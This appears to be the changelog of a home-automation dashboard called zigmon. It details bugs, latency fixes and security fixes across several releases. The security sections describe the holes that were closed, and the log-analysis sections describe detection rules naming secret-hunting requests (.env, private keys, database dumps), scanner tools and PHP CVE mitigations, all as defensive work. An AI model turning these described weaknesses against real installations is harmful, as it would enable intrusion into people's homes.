Also mended: run as `/usr/local/bin/zigmon` - a link to the program - `sudo
zigmon --full-backup`, `--full-inspect` and `--full-restore` looked for root's
helper beside the link and found none. And the relay let a name through only
when it was on its list as well as in its map: `test/endpoints.py` now checks
the two agree.

Checked by `test/system.py`, `test/online.py`, `test/rbackup.py` and
`test/console.py`, each new, each failing on 5.20.0.

5.20.0 — a read through the whole application, and what it found.

Every part was read again - the daemon, the root helper, the relay and the
page - and each fault found was proved first and is now checked by
`test/review.py` (which fails on 5.19.2 in 33 places) or, for root's side, by
a new block in `test/root.py`.

**Safety**

* **A backup made elsewhere chooses no path and no mode.** An uploaded
  backup could put back a `config.json` whose `db_file` pointed anywhere,
  and the database of the next one was then written there by root - any
  bytes, any file. A configuration from elsewhere now keeps this machine's
  own paths and port (`db_file`, `state_dir`, `log_file`, `token_file`,
  `api_host`, `api_port`, `log_to_journal`), a database put back must be an
  SQLite database, one outside the state folder is put back by root on the
  command line only, and the owner and the mode of a file are no longer the
  upload's to say (`config.json` came back 0666).
* **Root sets an owner and a mode on the open file**, never by its name: in
  a folder zigmon may change, the name could be swapped for a link to any
  file while the data was being written.
* **A PIN account made without a PIN** was given the PIN "None".
* **The blocked list stays an administrator's.** `address :1.2.3.4` (or in
  capitals) was not refused like `address:1.2.3.4`; the House and Blocking
  objects and the message preview told anybody the dashboard is shown to who
  is kept out and why, and the numbers alerts go to. They now say
  *(sign in)* to everybody but an administrator.
* **`?api=…&t=…`** skipped the check for a request sent by another site.
* **A room's name** went into the PIN dialogue as HTML.
* **The login settings** (`login_tries`, `login_wait_min`) are locked like
  every other security setting: a script or a text cannot change them.
* **Ending one sign-in** by an id of a letter or two ended every sign-in
  starting with it; the whole id is needed now.
* A PIN account's name answered a password five times faster than any other
  name, which told which names were PINs; `minutes` of infinity on an unlock
  was an internal error.

**The house**

* Rules that must hold for a while ("no motion for ten minutes") stopped for
  good once the rules had fallen far enough behind to drop the oldest.
* A **Shelly PM Mini (pm1)** was never read.
* A balance written with thousands - "1 247,50 Kc", "1.247,50" - read as
  247.50.
* `2h14m` and `1h30min` read as 14 and 30 minutes; `.thousands` dropped the
  decimals after a comma; `.round1` said "-0"; `{x.nth:0}` said the first
  item; a `{repeat}` or `{for}` of more than 200 never said its last turn.
* A condition in Czech quotes, „like this“, did not compare.
* An SMS of emoji or of `{}[]~|^` was counted as fewer parts than it is; a
  nine-digit national number was sent to the CGI gateway as `00777…`.
* UniFi's `na` (802.11n on 5 GHz) was called WiFi 2; an ntfy address with an
  IPv6 host lost its brackets.

**The page**

* *Editing 14:25* counted down by the browser's clock against the server's
  end: a browser a quarter of an hour fast locked itself again at once.
* Moving a card sent every list from the page's own old copy, so a second
  tab's order was undone; only the list moved goes now.
* The live log of a database job could repeat lines; `-0` is shown as `0`;
  a settings export after midnight was named for the day before.

`test/taps.py` wrote its log lines as `+0200` whatever the machine's zone was,
and failed in winter and on a machine in UTC.

5.19.2 — the frame of a card being rearranged shows on every side.

With *Rearranging* on, every card that can be moved wears a dashed frame; it
was drawn just outside the card, and the page's own edge cut it off on the
left of the first card in every row - on the Overview, Sockets, Sensors,
Buttons and the rest alike. The frame (and the one of a card being dragged)
is now drawn just inside the card, whole wherever the card sits. Checked by
a new block in `test/columns.py` (fails on 5.19.1).

5.19.1 — PIN accounts: the PIN as it was, with a role.

An account can now sign in with a **PIN** instead of a name and a password -
described under *Signing in*:

* **The page as before 5.19.** Where there is a PIN account, the header says
  *Locked* with the padlock; clicking anything that changes something asks
  for the PIN in a box per digit (the last digit unlocks) and how long to
  unlock for - 5, 15, 30, 60 or 240 minutes; the header then counts down,
  *Editing 14:25*, and clicking it locks again. *Sign in with a name and a
  password instead* is one click away in the same dialogue; a house without
  a PIN account looks exactly as in 5.19.0.
* **A role like any other account.** Each PIN belongs to an account -
  *kitchen*, an operator, unlocks the sockets and the scenes and no settings;
  a read-only PIN shows the house to a wall tablet when it is not public.
  Every PIN differs from the others (it is what tells the accounts apart),
  4 to 12 digits or letters.
* **Settings - Access - Add an account** has *Signs in with: a name and a
  password / a PIN*; a PIN account carries a *PIN* mark in the list, and its
  key button gives it a new PIN, ending whoever unlocked with the old one.
  Root: `zigmon --account-add kitchen operator --with-pin` (the PIN is made
  up and printed), `--account-password kitchen` for a new one.
* **The page that is only a sign-in** (the house not public) asks for the PIN
  first when there is a PIN account, and for how long.
* **As safe as the sign-in.** A PIN is a PBKDF2 hash like a password; the
  unlock is kept in the same HttpOnly cookie and ends when its minutes are
  up; five wrong PINs make that address wait, and wrong PINs from outside the
  house are also counted all together. A PIN account cannot sign in with its
  name and its PIN as a password.
* **Coming straight from before 5.19**, the PIN in config.json becomes a PIN
  account called *PIN*, an administrator, as it was - so the house unlocks
  the way it always did, beside the new *admin*. A house already on 5.19.0
  does **not** have the old PIN opened again: there an administrator makes
  the PIN accounts wanted.

Checked by `test/pins.py` (new, fails on 5.19.0) and a new block in
`test/render.js`.

5.19.0 — signing in by name and password, as otp does.

The PIN everybody shared is gone. The dashboard signs people in with an
account of their own - described under *Signing in*:

* **Three roles.** Read only sees the house; an operator uses it (sockets and
  lights, scenes, sequences, rooms and heating, alerts); an administrator
  also looks after it - every setting, the security, the accounts, the
  machine. What the PIN stood in front of is the administrator's.
* **The page as otp has it.** A name pill in the header (*Sign in*, or who
  is signed in and as what) with *Change password* and *Sign out*; a sign-in
  dialogue wherever something asks for one; a page that is nothing but a
  sign-in when the house is not shown publicly (`public_view`, now on
  Settings - Access).
* **Accounts on Settings - Access**: made, given a role, a new password,
  switched off, deleted; who is signed in, from where, and ending any of
  them. The last administrator cannot be taken away.
* **Safer than the PIN.** PBKDF2 passwords; the sign-in in an HttpOnly,
  SameSite=Strict cookie the page's script never sees (it held the unlock
  token before); five wrong passwords make that address wait, and a name
  nobody has is answered like a wrong password; a sign-in survives a restart
  of the daemon - a restore or an upgrade no longer signs anybody out - and
  ends when unused (240 min) or at the latest after 30 days.
* **The command line** is let in by a key only root and the daemon read
  (`/run/zigmon/cli-key`): the API token alone, which the web server holds,
  no longer opens what an administrator may do. `--pin` is still taken and
  ignored. New: `zigmon --accounts`, `--account-add`, `--account-password`
  (the way back in), `--account-role`, `--account-off`/`--account-on`.

**Upgrading from the PIN**: after `install.sh --upgrade` (or an upgrade from
the page) sign in as **admin** with the password in
`/var/lib/zigmon/first-login.txt` (`sudo cat` it), choose your own, and make
an account for each person on Settings - Access. Everything else - the
one-tap links, the SMS gateway and its commands, phone presence reports,
sensor pushes, the broker - is untouched: none of them ever used the PIN.
Putting a database back keeps the accounts as they are; a page left open
from before the upgrade says to load it again.

Checked by `test/accounts.py` (new, fails on 5.18.2) and a new block in
`test/render.js`; every check that leant on the PIN now signs in instead.

5.18.2 — the firewall's cards save themselves.

Each of the two firewall cards has its own Save at its foot again, as every
other card of zigmon has, saying "Unsaved changes" beside it - not one bar for
both, held at the bottom of the window. *Save who may reach the pages* saves
the three lists (the firewall as it was last saved goes with them, not what
is half-changed below); *Save the firewall* saves the switch, the rules of
your own and what zigmon lets in by itself (with the lists as they were last
saved). A change in one card no longer marks the other as unsaved.

5.18.1 — the panes of 5.18 as otp draws them.

The firewall, certificate, upgrade and whole-backup panes of 5.18.0 had styles
written by hand after otp's; they now carry otp's own rules for the same
things (its popup, the TLS tiles, the certificate card, the firewall cards,
the drop zones, the switches), so the two look the same. In detail:

* the TLS popup: the four presets as tiles of one height, the "recommended"
  mark inside its tile, the headings as otp has them;
* the firewall has one save bar for both its cards, as otp's settings have:
  where it falls while nothing is changed, held at the bottom of the window
  with "Changes not saved yet" once something is - not two pairs of buttons;
* room between a drop zone and the buttons under it;
* "Throw the package away" showed with no package to throw away (a button's
  own display beat `hidden`);
* a popup that is itself the question - throw this away? delete that? -
  asked "Really?" a second time inside it, and showed both rows of buttons
  at once; it asks once now. A destroying button in any other popup still
  asks twice, in place of the buttons rather than beside them.

Also the review of 5.18.0: with no PIN set at all, root's roads were open;
how a restore ended could be hidden by the apply asked after it; a pane
stopped redrawing while one of its buttons had the focus, and stopped for good
when the browser tab was hidden; an upgrade request nothing took blocked every
later one; pieces of an upload that never finished stayed. Each is checked in
`test/admin.py` or `test/render.js`.

5.18.0 — the firewall, the certificate, upgrades and the whole installation, from the dashboard.

What otp does for its machines, zigmon now does for the house, drawn the same
way: its cards, its popups that ask twice before anything that destroys, its
progress bars. Each is described under *Looked after by root*; in short:

* **Control - Firewall**: who may reach the dashboard, the one-tap links and
  the SMS gateway (nginx `allow` lines), and the firewall itself - iptables
  or firewalld - with what zigmon needs let in by itself and your own rules
  before it. Never shuts out the address you are on; put in again by itself
  when changed by hand.
* **Control - Certificates**: upload PEM or PFX, make a request (CSR) whose key
  stays here, or a self-signed one; how TLS is spoken; HSTS; DH parameters.
  The broker shares the files and is told to read them again. Warned 21, 7 and
  1 day before it runs out.
* **Control - Upgrades**: a signed package dropped on the page, checked, put in
  after a backup, and taken back by itself when the new version does not
  answer.
* **Control - Backup - The whole installation**: everything the machine needs
  to be this house again, sealed, nightly, downloadable with a password, put
  back part by part - from a foreign file only what cannot make anybody root.

Root does the work through two path units installed by `install.sh`
(`zigmon-root.path`, `zigmon-upgrade.path`); the daemon still never runs as
root. **The first upgrade to 5.18.0 must be done on the command line**
(`sudo ./install.sh --upgrade`), because that is what installs them; from then
on new versions can go in from the page. Releases are signed with Ed25519; the
public key ships in `deploy/release-keys/`.

Also: 5.17.0's `install.sh --upgrade` did not list three nginx files that had
changed in it as ones to look at by hand (`nginx-zigmon.conf`,
`nginx-tap-front.conf`, `nginx-ntfy-front.conf`); it does now. The toast is
drawn above every popup. Checked by `test/root.py`, `test/upgrade.py`,
`test/admin.py` (new) and a new block in `test/render.js`, each of which fails
on 5.17.0.

5.17.0 — the whole of it again, slowly.

This time the request was simply to go over everything once more, as closely as
possible, for bugs, for holes and for anything between a sensor and its light.
What follows was each found, reproduced on 5.16.0, mended, and checked by
something that fails on 5.16.0 and passes now: `test/hunt.py` (twenty-one
groups of checks against the daemon), `test/edge.py` (a real nginx and a real
php-fpm with the shipped files, sent requests), and two more in
`test/render.js`.

**The holes**

* **The link road reached every API.** `/tap` is the one address the server in
  front lets through without anything else, for the watch and the phone. Its
  rule in nginx handed the rest of the address on, and the page read `?api=`
  from it: `POST /tap?api=unlock` was a PIN guess past every limit on the
  normal road, `?api=config-save` and `?api=permit-join` were the settings and
  the Zigbee network, and `/tap/<link>?api=status` the whole status - all from
  outside, through the one door meant to do one thing. nginx now hands that
  road nothing but `api=tap` (or the link and `ask`), and the page pins the
  road by its path before it reads anything else, so a file of nginx's from
  before this one is covered too. The SMS road is pinned the same way.
* **Another site could press the buttons.** A page anywhere on the internet,
  opened in a browser that had the dashboard unlocked, could send it a POST -
  a form or a fetch needs no permission to be *sent*, only to be read. Every
  POST that says it came from another site (`Origin`, `Sec-Fetch-Site`) is
  refused now; the links, the gateway's texts and a phone's presence report,
  which come from no page at all, are not affected.
* **Phone numbers were in the status.** The status is answered without the PIN
  - with the view public, which is the default, it is what anybody on the
  house's network can open - and it carried every number in the house: each
  person's (twice), the numbers alerts go to, the numbers allowed to command
  the house by text, the numbers a message is sent to and the texts waiting to
  go; and the list of objects named a waiting text by its number. All of them
  are shown as `+•••••••456` now. An unlocked page reads the real ones behind
  the PIN, and what the page sends back as it was shown is kept as it was - a
  number added beside hidden ones included.
* **…and every save of the people broke the phones' own links.** The page
  never holds a phone's token, so each save sent it back blank, and blank with
  phone reports on was taken as "make a new one": the phone's link stopped
  working at every save of the people or of the SMS tab, without a word. Blank
  means "the one it has" now.
* **The second factor was skipped on the address road.** With both roads open
  and a code (or Duo) switched on, a link opened by its address did what it
  does without either - on a house that turned the code on so that a leaked
  link would not be enough. The address road only answers how things stand
  now; acting needs the header road, which carries the code.
* **The unlock token was written into the web server's log.** Every poll made
  while unlocked carried it in its address, and so did the download of a
  private key or a backup. It travels in a header now, all the way to the
  daemon, and the logs of the front proxies no longer record cookies or an
  `Authorization` header whole, only whether one was sent.
* **A text from another country was the owner.** Numbers were compared on their
  last nine digits, so +421 777 123 456 - another phone, and a sender anybody
  can claim - had the run of the house by text if +420 777 123 456 had it.
  Two numbers that both say their country are compared whole; a shorter entry
  no longer matches every number that ends with it.
* **One line of the proxy's log could hold its reader for seconds.** A request
  line nobody closed - one long word and no quote - is something anybody can
  write into that log, and the pattern reading it went through every way of
  splitting it: **4.1 s for a line of 100,000 characters, 17.7 s for the
  longest on record → 4 ms**, and the same 2,416 real lines read the same.
* Smaller: the PIN compared in constant time; X-Forwarded-For cut to its first
  120 characters (losing the one address the server in front wrote) is cut
  from its other end; a rule's "now" reading, and a chart's unit and colour
  (in its tooltip, its line, its dots and its legend), were put into the page
  as HTML; the record kept of what the SMS gateway sent kept a
  cookie or an `Authorization` header that came with it whole.

**The bugs**

* **An "away" alarm went deaf after every homecoming.** It fired on movement
  in an empty house; the owner came home, the sensor went quiet while they
  were in - a reading the rule did not look at - and the next movement after
  they left found the rule "already true". A burglar after a homecoming was not
  reported. A rule stops remembering when it stops being watched.
* **"On for a while" counted from the first press.** Pressed again a second in,
  "on for 2 s" went off at two seconds anyway, and a contact bouncing left a
  sleeping thread per bounce (500 for 500). There is one way back per light
  now, moved on by each press, and a light held by "for" stays held for it.
* **"No motion for ten minutes" at night counted from the night before.** The
  quiet was counted from before the rule's window opened, so the light went off
  at 22:01 with somebody in the room. It counts from inside the window.
* **A block could miss the door for a minute.** A reading of the blocked list
  that started just before a block wrote its stamp over the block's "read me
  again". The door has the block **within half a second**.
* **The nights the clocks change.** On 25 October the quiet hours ended at
  06:00 instead of 07:00; on 28 March a schedule at 02:30 - a time that does
  not exist that night - did not happen at all; daily energy and "yesterday"
  were an hour off on both nights. All worked out from the wall clock now.
* **Alerts from several threads at once** could break the notifier's
  bookkeeping (a "dictionary changed size" error); the duplicate check is held
  under a lock.
* **A restore could be undone by a reader**: a rule read in the moment between
  the restore emptying what is held in memory and taking the lock put the old
  rules back in force (1 or 2 restores in 20).
* **A device paired a moment ago** lost its first report, which arrives while
  the new list of devices is still being taken in. It is held and heard after.
* **Any "429" was "too many requests"**: a box called Pokoj-429 or on port 4290
  was never shown as gone.
* **The plug card never showed the watts.** It read them from where they had
  not been for a while.
* The schedules took the day from a second look at the clock rather than from
  the one they were working with.
* **The PIN box could come up by itself and freeze the page.** The live log of
  a database job is asked for every 0.9 s while the job runs; with the lock
  run out in the middle of one, each answer brought the PIN box up uninvited,
  and while that box held the focus no card on the page was drawn again - the
  "gateway header" check of `test/render.js` had been failing on it now and
  then since 5.16 without anybody knowing why. That log asks quietly now, as
  the other lists that refresh by themselves do.

**Realtime**

* **On and straight away off ended on.** Two commands to one socket went on two
  connections; when the first was slower on the Wi-Fi the second overtook it,
  and the light stayed on with the house sure it was off. Commands to one
  socket go one after the other, and a slower one already overtaken does not
  fall back to HTTP and undo the newer one.
* **A pressed link answered after a fixed 350 ms**, every press. It answers as
  soon as its light has moved: **352 → 6 ms**.
* **A rule's "wait N s" ended on the next quarter-second beat**: up to 203 ms
  late. The beat wakes for the moment itself: **1 ms**. The way back of "on for
  a while" the same.
* **A scene was shown after its last socket.** Every socket that answered put
  the page's wake off again, so a strip of four answering 200 ms apart was on
  the page a second after the first lamp lit. The page hears **0.45 s** after
  the first now, then again as the rest come in.

5.16.0 — what stood in front of a light without being on its way.

The question this time came with a suspicion attached: a notification had gone
out, and a socket switched late. So the first thing measured was exactly that,
and the direct road turned out clean — a motion sensor reaches its light in
3 to 9 ms with "tell me when a rule fires" on, a ntfy server taking two seconds
over every message, thirty notifications already queued, a message on the same
sensor, and the database held by a backup. Notifications only ever join a
queue. What was found instead is everything that stands in front of a light
*from the side*: something else holding a thing the light needs for a moment.
Fifteen of them, every one measured on 5.15.0 first, with checks that
fail on 5.15.0 and pass now (`test/lags.py`, two more in `test/realtime.py`,
one in `test/render.js`).

**Nothing on the way to a light writes the log any more.** A rule writes its
line and *then* sends the command; a press does the same; the broker's own
thread writes a line for what it hears, and while it is writing no Zigbee
command can leave. Every line was written by the thread that said it — into the
journal, a pipe journald empties when it gets round to it, and into a file that
lands in the page cache only until a backup has the disk busy. With the journal
taking 150 ms over a line, motion reached its light in **154 ms every time
instead of 3**. The daemon now hands its lines to a thread of its own; the
command-line tools still write where they are, because their output has to come
out in order. **154 → 4 ms.** A journal that stops for minutes cannot take the
memory with it: past 20,000 waiting lines the oldest go, and the writer says how
many when it can write again. Notifications are one of the things that write
lines — a ntfy server that is down writes a warning per message — which makes
this the most likely way a notification ever delayed a light here.

**Python is handed between threads ten times as often.** It runs one thread at
a time and hands over every five milliseconds unless told otherwise, and the way
from a sensor to a light changes hands half a dozen times. With two threads busy
— the status being built for each open tab after the very report that turned
the light on, the words of a message — motion took **91 ms to reach its light,
143 at worst**. At half a millisecond: **14, 21 at worst**, and busy work costs
nothing measurable more. It is a setting (`gil_switch_ms`, 0.5) on the card
with the other things about speed.

**…and there is less of that busy work.** Every open tab, the watch and the
phone are woken by the same change and all ask for the status at once; each
built its own — a walk over every device and a third of a megabyte of JSON — in
the milliseconds after the change. One is built now and handed to everybody
asking about the same moment: six tabs on an 80-device house, **18 ms of the
interpreter → 3**.

**A socket that does not answer over MQTT is not waited on every time.** A
command over the broker waits two seconds for the box's answer before HTTP is
tried. That was paid on *every* command to a box whose RPC over MQTT does not
answer, for as long as it stayed that way — only the warning in the log was
said once per ten minutes. **2,004 ms a light, every light.** A box that stayed
silent is driven over HTTP straight away for the next ten minutes and then tried
on the broker again; one whose own reading says it is not connected to the
broker (`mqtt.connected: false`, which every box in this house said in October)
is not asked over it at all. **2,004 → 3 ms.** If the sockets here have MQTT
switched on in zigmon, this was every light in the house.

**…and after that fallback, the house believed the wrong thing.** Found while
measuring the above: the read that follows a switch went out while the command
was still lost on the broker, found the relay as it was, and was written down as
fresh after HTTP had switched it. So the house believed a light was on that had
just been switched off, and **the next rule asking for it on was skipped as
"already on"** — a dark room until the next round of readings put it right. A
reading asked for before a switch no longer overrides it, and the fallback
writes down what it did.

**A rule on a group of sensors no longer waits for the database.** A sensor
group re-states its own device row every time it moves, and that was a SELECT
under the database lock on the rule worker — so every light behind "any PIR
downstairs" waited for whatever held the lock. **1,485 ms behind a backup,
every time** (not only the first). The rows are read into memory at the start,
read back by themselves after a restore or a sweep of stale devices, and a row
that has not changed is answered from memory. **1,485 → 4 ms.**

**The bridge's big answers are not read on the broker's thread.** All of them
are retained, so they arrive again on every reconnect, and while that thread is
busy no report is heard and no Zigbee command leaves. `bridge/definitions` —
4.7 MB on Zigbee2MQTT 1.x, read and thrown away — **137 ms → 0**. The
coordinator's own backup, decoded and written to disk there: **20 → 0.6 ms**. The
network map, whose answer was written into the settings under the database lock
right there: **1,436 ms** while a backup held it, every thirty minutes — **0.1
ms** now. Both are still done, behind it, in the order they came.

**The quarter-second beat keeps its time.** It finishes "off after fifteen
seconds" and starts a schedule on its minute, and every thirty seconds it also
did the chores: the heating, the alerts about the house itself, the digest, the
blocks that ran out — several of which read the database. Behind a backup the
beat stood still for as long as the backup held it, with every delayed action
due meanwhile. The chores have a thread of their own; **the longest gap between
beats under a busy database is 0.25 s**.

**The door of the API reads the blocked list it already has.** Every click,
every press of a link and every text from the gateway is asked about the
blocked list before anything else happens to it, and the list was read again
from the table whenever it was two seconds old — 27,000 rows on this house, under
the database lock — by whichever request came first. A click behind a backup
waited **1,450 ms** for it; it waits **0.5 ms** now, and a fresh list is read
behind it. A new block still reaches the door within a moment.

**A rule that wants somebody home does not ask the Wi-Fi again when somebody
is.** The fresh look exists for "nobody home": somebody walks in and the sensor
trips before the phone is seen. A rule wanting somebody home that already has
that answer gains nothing from asking — the most it could learn is that they
have all left in the last few seconds — and it was asking on nearly every firing,
a TLS handshake and a request to the controller in front of the light each time
(capped at 0.4 s since 5.14). "Nobody home" still looks before it believes it.

**Smaller ones, each on the way to a light:**

* A reading of a box sent its second and third requests a second after the first
  without asking whether somebody had pressed in the meantime — so the command
  and the reading arrived together and the box answered one of them "too many
  requests", and a command that gets that waits a third of a second and more.
  They wait for the next round now.
* "Too many requests" to a *reading* was counted as the box failing: three of
  them and a working box was shown "lost contact", and its next command was given
  one short try instead of the patient ladder. A busy box has answered.
* A rule comparing against the day's average worked that average out again under
  the database lock on the rule worker every ten minutes: **1,450 ms** behind a
  backup. The old figure answers and the new one is worked out behind it.
* A step of a sequence wrote down where it was, under the database lock, before
  its light moved — and so did the next press of every sequence in the house.
  **1,452 → 3 ms**; the position is in memory at once and on disk behind.
* A text message that switches something was written into the message log under
  the lock first. It is written behind now.
* The socket controls on the dashboard were built again whenever any reading
  changed, which is nearly every status — every On and Off button with them. A
  tap whose press and release fell either side of a rebuild landed on a button
  that was no longer there, and nothing happened. The watts and the counters are
  written into the buttons that are there; the card is built again only when
  something about its shape changes.

**Looked at and left alone:** a ntfy or Telegram server that is slow or down
(sent on their own thread, measured: no effect on the light); a message whose
words walk a house with 27,000 blocked addresses (24–30 ms, on its own thread,
4–11 ms on the light beside it); an SMS whose log is parsed before it acts
(10–50 ms against the seconds a text takes to arrive); the php-fpm pool (enough
workers for the tabs this house keeps open).

5.15.0 — the two holes in PHP, and what a month of logs said about the rest.

Two things, on the day they were both needed. PHP published two holes in its
own handling of a request on 21 October 2026 — **php2shell, CVE-2026-109618
and CVE-2026-109619, both 9.2** — and this house's own logs for the ten days
to that morning turned up a scanner already sending the shape that reaches
one of them, four hours before the patch was published.

**Why a Python daemon cares about a hole in PHP.** The dashboard is PHP, and
both of these are reached *before any page of this house runs*. One of them
interrupts PHP while the data for a request is half set up, by running it out
of memory; the other lets the state of a finished request outlive the memory
it was in, so that the next request on the same worker reads it. Neither
needs a password, a link or a name. The PIN, the allow rules, the API token
and every check written into index.php are all behind the point where it
happens, so none of them is worth anything here. **Only the version of PHP
mends it: 8.2.35, 8.3.36, 8.4.27, 8.5.12 or newer, or a distribution's
backport.** Everything below is what can be done in front of that.

**Both nginx files now refuse a multipart body before PHP sees one.** The
multipart parser is the way into the second hole, and it runs for any
multipart body at all, whether an upload was wanted or not. Nothing in this
house has ever sent one: all three file pickers on the dashboard — a settings
export to put back, a trial file, a database to restore — are read in the
browser with FileReader and sent as JSON or as the bytes themselves, and
there is no form with an enctype and no FormData anywhere in the page. So the
shape is refused at server level in the home config (415, because that vhost
is the one reachable from the sofa and a person debugging deserves a reason)
and in the one facing the internet (444, which says nothing). It stays there
after the update: PHP's multipart parser has now had two of these. A check
keeps both halves honest — that the rule is there, at server level rather
than inside one location, and that the page has not started sending a
multipart body behind its back.

**`zigmon check` now says which PHP is serving the dashboard and whether it
carries the fix**, and so does the installer, and so does the dashboard —
there, on the card about the server in front rather than on the health card,
because that one answers without a PIN and the version of PHP is the first
thing anybody deciding what to try would like to be told. A distribution that
backports a fix does not move the version number, so the package's own
changelog is asked as well and has the last word; a branch upstream does not
publish for (8.1 and older) is reported as that rather than as "fine", and a
branch newer than the table is not reported as broken. The daemon says it once
a day, as a critical, for as long as it is true — and once when it stops being.

**A worker that dies in the middle of answering is now said out loud.** It is
the one thing anybody can watch for without a signature: both holes work by
corrupting a worker's own memory, so a worker that accepts a request and then
goes away is what they look like from outside. nginx writes it as "upstream
prematurely closed connection"; the error log was read for servers that would
not *accept* a connection and this shape fell between the lines. It is never
weighed against the caller, on purpose: the dashboard's live update holds a
php-fpm worker for as long as it waits, and a timeout set too low would put
the family's own browser out.

**The installer writes two php.ini lines and deliberately does not write a
third.** `session.upload_progress.enabled = 0` takes away one of the two
published ways in and nothing here uses it; `session.use_strict_mode = 1`
costs nothing on a dashboard with no sessions at all; `expose_php = Off` stops
this machine telling a scanner which hole to try. `open_basedir` is the
obvious fourth line and is not written: index.php reads /etc/timezone to know
what time it is, and it mends neither hole. On a machine being upgraded the
nginx rule is added to the config that is already there — written, tested with
`nginx -t`, reloaded, and put back exactly as it was if nginx will not have it.

---

Then the logs themselves: ten days of the front server's access log, a month
of its error logs, 5,249 Suricata events and the notification server's own.

**A multipart body is now weighed wherever it reaches PHP, and weighed at
nothing before.** On 21 October at 00:36:18 one address sent eight of them in
the same second — POST to /, /login, /\_next and /api, twice over, 131,874
bytes apiece, with Assetnote's name on them — four hours before PHP published
anything. Measured against the build before this one: **0 of 15**. It is 8
now, which is half the standing bar, like every other thing nobody does by
accident: the first one is said and the second is a block. On the one-tap
road, which is the only road that reaches PHP from the internet, a single one
is a block on its own, because nothing holding a link ever sends one.

**A content-length that cannot be a length is weighed too.** Three callers
sent 18446744073709551615 — two to the power of sixty-four, less one — which
is what a length looks like when somebody wants the thing reading it to count
backwards. On an odd method it was worth 4 for the method; on a plain POST,
nothing at all.

**An error line is now read for what was ASKED for, before why nginx
complained — and this was the biggest hole of the three.** The words an error
line is recognised by were walked in order, stopping at the first match, and
the first of them was "upstream": our own fault, worth nothing. So every
error line naming an upstream threw away the request written in the same line,
and "limiting requests" threw it away by calling it a flood. In this house's
own error logs of 16 September to 21 October: **164 lines dropped that way and
524 called a flood, between them carrying 552 requests for .env, .ssh/id_rsa,
wp-config.php, backup.sql and the rest.** One address asked for **thirty** such
things in two seconds — every .env by another name, two private keys, four
database dumps — and **scored nothing at all**; the access log for that server
was empty that month, so the error log was the only record of that burst
anywhere. It is weighed at 8 a line now, and that address is put out after the
second. The same fix mends something quieter: `proxy-flood` is forgiven for an
address that pressed a link lately and `proxy-secret-hunt` is not, so all 524
of those were also passing over for anybody who had used the house in the last
two days.

**Ten tools that name themselves were not recognised as tools.** WebSiphon is
the reason the list was looked at again: **892 requests from three addresses in
ten days, more than a third of everything the front server was asked for**,
and every one of them read as somebody mistyping an address. With Assetnote,
Infrawatch, webatlabot and the rest, 435 requests a week change from "asked
for the machine by its address" to "a scanning tool that says what it is".

**What all of it adds up to, replayed over the whole month of this house's own
logs: 111 addresses put out before, 112 after — and not one of the 111
lost.** The one new address is the thirty-request secret hunt that used to
score zero. The rest of the difference is not more blocking but better
reasons: 612 secret hunts became 1,163, and 582 floods became 57, because most
of them were never floods.

---

**Two things were tried, measured and taken out again.**

The scanner-agent rule was missing from the reader of the full log, which
looked like an obvious gap — 32 requests from l9scan weighed there, 19 of them
at a path worth nothing, on a machine whose access log was empty. Putting it
in made one visit worth twelve of fifteen instead of six, because the same
request is written to both logs: replayed over the real month it blocked an
address for a single `GET /` from zgrab, and another for two requests from an
academic crawler. That is against the rule the weight was chosen for — one
visit from a research scanner is not a block, a round of them is — and the gap
cost nothing in the end, because the address it was found on was put out anyway
on the paths it asked for, at 102 of 15. Taken out, with the measurement left
in the file beside it.

Fifteen refused requests for the same page in two seconds from one address,
which went free. It folds to one thing worth 4, and the rule meant for bursts
says twenty. That is not a fault but the threshold as written, so it stands:
one address of 452 in ten days, against a rule that says forty identical
requests is a block and twenty is a notice.

**And two suspicions that the data disproved.** There is no sign of a PHP
worker dying anywhere in a month of these logs — the watch above is for
something that has not happened here yet. And the Suricata floor hides nothing
by accident: `ids-noted` looks unreachable, and is, at the default setting of
2; it is what a house that raises `suricata_least` to 3 gets, which is the
point of the setting.

5.14.0 — nothing on the way to the light may wait for anything.

A tenth reading, with one question: from a sensor seeing somebody to the light
being told, where can anything wait? Everything below was measured, most of it
against the house's own database and its own month of events — 51,952 of them,
which turned out to know more about what is wrong with this house than any
reading of the code did.

**The way from a sensor to the light now takes the database lock no times at
all.** That is the whole point of the house, so it is worth saying as a
number: a counter on that lock says **three** acquisitions on the FIRST firing
after a start and none after — three settings nobody had ever written, each
looked for in the database under the one lock that a backup holds for a second
and a half and an optimise for longer. The settings table was read into memory
only before a VACUUM, never at startup; it is read at startup now, and a key
that is not in it is known to be absent rather than looked for. **3 → 0**, and
a check keeps it there.

**A rule never waits on the network.** A rule gated on who is home asked the
Wi-Fi controller afresh, on the rule worker, with a three-second timeout: a
controller that accepts the connection and then says nothing held that worker
**3,046 ms**, with every other gated rule of every other report queued behind
it. This house has eight such rules sitting on the same motion sensors as its
lights. The look is worth having while the controller is healthy — it answers
in a fraction of a second — so it is now bounded at four tenths (`presence_look_s`)
and the last answer stands past that: **3,046 ms → 443 ms**. And "switch off
when there has been no motion for N minutes" is finished on the plain queue
rather than the one that waits on the network, where it was late by a median
of 751 ms and as much as 3,300.

**A command nobody heard is asked again.** `Switch.Set on` means the same
thing however many times it is said, and nothing ever repeated it: a single
packet lost on the way to a wireless socket was a dark room, with five seconds
of waiting first. A command now gets three chances on a ladder that adds up to
the same patience as the one timeout it replaces — so a box that is really
gone is given up on no later than before, and a lost packet costs **1,004 ms
and the light comes on** instead of 5,006 ms and nothing. `Switch.Toggle` is
never repeated: the box may have had the first one, and the light would end up
where it started. And a box whose last three readings all failed is given one
short try rather than the whole ladder: **5,005 ms → 1,002 ms**. This house's
own month holds 326 commands that timed out, 201 of them at one light.

**A strip of four is switched as four.** A four-socket box is four relays and
will answer four requests; they were sent one at a time, so the last socket
moved a second after the first — measured **252, 505, 760, 1,014 ms**, against
**252, 257, 262, 267** when they go together. Worse, when such a box is off
the air the four timeouts added up rather than overlapping: twenty seconds for
four sockets instead of five. A box that answers "too many requests" is taken
at its word and asked one thing at a time for the next two minutes, by itself,
and the measurement shows it doing so.

**A socket's own report reaches the rules.** A Shelly on the broker says the
moment its relay moves or its watts change — a wall button, its own app, a
washing machine finishing. That is the fast road, and it updated the page and
the state and then skipped every rule watching that socket: such a rule was
served only by the reading that comes round every fifteen seconds. "When the
washer stops drawing power, switch the lamp on" heard **nothing**; it now
fires in **2 ms**.

**The bridge's device list leaves the broker's thread in 0.7 ms.** Zigbee2MQTT
publishes it retained, so a copy arrives on every connect and again on every
rename, pairing or restart. Walking it cost that thread **226 ms** cold and as
much as 443 ms while the writer had a restart's worth of readings queued — and
for that whole time the house is not heard and nothing can be published, which
